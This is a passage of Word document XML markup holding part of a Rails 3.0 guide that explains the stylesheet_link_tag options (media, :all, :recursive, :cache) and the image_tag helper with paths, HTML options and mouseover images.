      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5876"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2E09EF44" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5EE5B97E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1322123639"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>stylesheet_link_tag "</w:t>
            </w:r>
            <w:hyperlink r:id="rId293" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://example.com/main.css</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4E2CCB09" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By default, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>stylesheet_link_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> creates links with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>media="screen" rel="stylesheet" type="text/css"</w:t>
      </w:r>
      <w:r>
        <w:t>. You can override any of these defaults by specifying an appropriate option (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:media</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:rel</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:type</w:t>
      </w:r>
      <w:r>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6743"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7262F304" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2775EF1D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1688170988"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>stylesheet_link_tag "main_print", :media</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "print"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5911C53B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the asset pipeline is disabled, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>all</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option links every </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>public/stylesheets</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3575"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="346974AB" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="19C84E1D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="76244789"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>stylesheet_link_tag :all</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4CAD9E8F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can supply the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:recursive</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to link files in subfolders of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>public/stylesheets</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as well:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5903"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="52818026" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3BA8B701" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="138814978"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>stylesheet_link_tag :all, :recursive</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4D1E0307" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you’re loading multiple </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> files, you can create a better user experience by combining multiple files into a single download. To make this happen in production, specify </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:cache =&gt; true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>stylesheet_link_tag</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6983"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="707DF0FF" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1366F97D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1567253471"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>stylesheet_link_tag "main", "columns", :cache</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2A935682" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By default, the combined file will be delivered as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>stylesheets/all.css</w:t>
      </w:r>
      <w:r>
        <w:t>. You can specify a location for the cached asset file instead:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4968"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="49E5537D" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="716A740B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>stylesheet_link_tag "main", "columns",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BF2BA64" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :cache</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'cache/main/display'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7DC0AEFC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can even use dynamic paths such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>cache/#{current_site}/main/display</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6405EBD0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.1.4 Linking to Images with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>image_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5234648D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>image_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helper builds an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;img /&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tag to the specified file. By default, files are loaded from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>public/images</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0254D5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note that you must specify the extension of the image. Previous versions of Rails would allow you to just use the image name and would append </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.png</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if no extension was given but Rails 3.0 does not.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3335"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7B214A04" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="577D4086" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="727070715"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>image_tag "header.png"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="47216687" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can supply a path to the image if you like:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4055"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7833E67B" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6767123F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1724716929"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>image_tag "icons/delete.gif"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7A1DF697" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can supply a hash of additional </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> options:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6095"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="4858D33C" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A89ED13" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1990790804"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>image_tag "icons/delete.gif", {:height</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 45} %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="12AC7CC4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can also supply an alternate image to show on mouseover:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8183"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="3E7EFA97" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7E3B281E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1476222353"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>image_tag "home.gif", :onmouseover</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "menu/home_highlight.gif"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="286037B7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
